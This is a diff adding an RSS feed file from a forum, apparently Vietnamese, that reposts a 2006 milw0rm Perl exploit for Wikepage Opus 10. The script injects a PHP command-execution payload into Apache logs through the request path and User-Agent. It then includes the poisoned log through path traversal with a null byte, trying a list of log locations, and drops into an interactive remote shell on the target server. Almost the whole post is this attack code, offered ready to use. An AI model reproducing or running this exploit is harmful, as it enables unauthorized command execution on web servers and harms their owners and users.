@@ -1,0 +1,129 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Wikepage Opus 10&lt;= Remote Command Execution Exploit"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Wikepage Opus 10&lt;= Remote Command Execution Exploit"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Wikepage Opus 10&amp;lt;= Remote Command Execution Exploit</title>
+				<description><![CDATA[ <span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>#!/usr/bin/perl
+#
+# WIKEPAGE &lt;= V2006.2a Opus 10 Remote Command Execution Exploit
+# -------------------------------------------------------------
+# IHST: h4ckerz.com / hackerz.ir
+# AST : Aria-Security.Net
+# Kapda : kapda.ir
+#
+#### &#40;c&#41;oded & discovered By Hessam-x &#40; Hessamx -at- Hessamx.net&#41;
+
+use IO::Socket;
+use LWP::Simple;
+
+print "-------------------------------------------------------------\n";
+print "=  WIKEPAGE &lt;= V2006.2a Remote Command Execution Exploit    =\n";
+print "=            By Hessam-x  - www.Hessamx.net                 =\n";
+print "-----------------------------------------------------------\n\n";
+
+if &#40;@ARGV &lt; 2&#41;
+{
+	print "&#91;*&#93; Usage: hxxpl.pl &#91;host&#93; &#91;path&#93;\n\n";
+	exit&#40;&#41;;
+}
+
+    $server=$ARGV&#91;0&#93;;
+    $path=$ARGV&#91;1&#93;;
+    print " SERVER : $server \n";
+    print " Path   : $path   \n";
+    print "-------------------------------------------\n";
+
+$pcode ="&lt;?php ob_clean&#40;&#41;;echo _Hessamx_;passthru&#40;\$_GET&#91;cmd&#93;&#41;;echo _xHessam_;die; ?&gt;";
+$socket = IO::Socket::INET-&gt;new&#40;Proto=&gt;"tcp", PeerAddr=&gt;"$server", PeerPort=&gt;"http&#40;80&#41;"&#41; || die "&#91;-&#93; Cannot not connect to host !\n";
+
+ print $socket "GET ".$path.$pcode." HTTP/1.1\r\n";
+ print $socket "User-Agent: ".$pcode."\r\n";
+ print $socket "Host: ".$server."\r\n";
+ print $socket "Connection: close\r\n\r\n";
+ close&#40;$socket&#41;;
+
+print "&#91;+&#93; PHP code injection in log file finished. \n";
+$log = "no";
+@apache=&#40;
+  "/var/log/httpd/access_log","/var/log/httpd/error_log",
+  "/var/log/apache/error.log","/var/log/apache/access.log",  
+  "/apache/logs/error.log", "/apache/logs/access.log",
+  "/etc/httpd/logs/acces_log","/etc/httpd/logs/acces.log",
+  "/etc/httpd/logs/error_log","/etc/httpd/logs/error.log",
+  "/var/www/logs/access_log","/var/www/logs/access.log",
+  "/usr/local/apache/logs/access_log","/usr/local/apache/logs/access.log",
+  "/var/log/apache/access_log","/var/log/apache/access.log",
+  "/var/log/access_log","/var/www/logs/error_log",
+  "/www/logs/error.log","/usr/local/apache/logs/error_log",
+  "/usr/local/apache/logs/error.log","/var/log/apache/error_log",
+  "/var/log/apache/error.log","/var/log/access_log","/var/log/error_log",
+&#41;;
+for &#40;$i=0; $i&lt;=$#apache; $i++&#41;
+  {
+ 
+print "&#91;+&#93; Apache Path : ".$i."\n";
+
+$sock = IO::Socket::INET-&gt;new&#40;Proto=&gt;"tcp", PeerAddr=&gt;$server, Timeout  =&gt; 10, PeerPort=&gt;"http&#40;80&#41;"&#41; || die "&#91;-&#93; cannot connect to host! \n";
+
+  print $sock "GET ".$path."index.php&cmd=id&lng=".$path&#91;$i&#93;."%00 HTTP/1.1\r\n";
+  print $sock "Host: ".$server."\r\n";
+  print $sock "Connection: close\r\n\r\n";
+
+    $out = "";
+    while &#40;$answer = &lt;$sock&gt;&#41; 
+    {
+    $out.=$answer;
+    }
+    close&#40;$sock&#41;;
+
+
+if &#40;$out =~ m/_Hessamx_&#40;.*?&#41;_xHessam_/ms&#41;
+  {
+  print "&#91;+&#93; Log File found ! &#91; $i &#93; \n\n";
+  $log = $i;
+  $i = $#path
+  }
+   
+  }
+if &#40;$log eq "no"&#41; {
+    print "&#91;-&#93; Can not found log file ! \n";
+    print "\n&#91;-&#93; Exploit Failed ! ... \n";
+    exit;
+   }
+print "&#91;Hessam-x\@ $server&#93; \$ ";
+$cmd = &lt;STDIN&gt;;
+
+while&#40;$cmd !~ "exit"&#41;
+{
+	$socket = IO::Socket::INET-&gt;new&#40;Proto=&gt;"tcp", PeerAddr=&gt;"$serv", PeerPort=&gt;"80"&#41; || die "&#91;-&#93; Cannot connect to host !\n";
+	
+	print $socket "GET ".$path."index.php?cmd=".$cmd."&lng=../../../../../../../../..".$path&#91;$log&#93;."%00 HTTP/1.1\r\n";
+	print $socket "Host: ".$serv."\r\n";
+	print $socket "Accept: */*\r\n";
+        print $socket "Connection: close\r\n\n";	
+	
+	while &#40;$answer = &lt;$socket&gt;&#41;
+	{
+	    print $answer;
+	}
+	
+	print "&#91;Hessam-x\@ $server &#93; \$ ";
+	$cmd = &lt;STDIN&gt;;	
+}
+
+# milw0rm.com &#91;2006-08-24&#93;</pre>
+		</div>
+Nguồn<span class="link"> http://milw0rm.com/</span>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/3197.hva#18028</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/3197.hva#18028</link>
+				<pubDate><![CDATA[Fri, 25 Aug 2006 14:37:52]]> GMT</pubDate>
+				<author><![CDATA[ anh_that_tinh]]></author>
+			</item>
+	</channel>
+</rss>
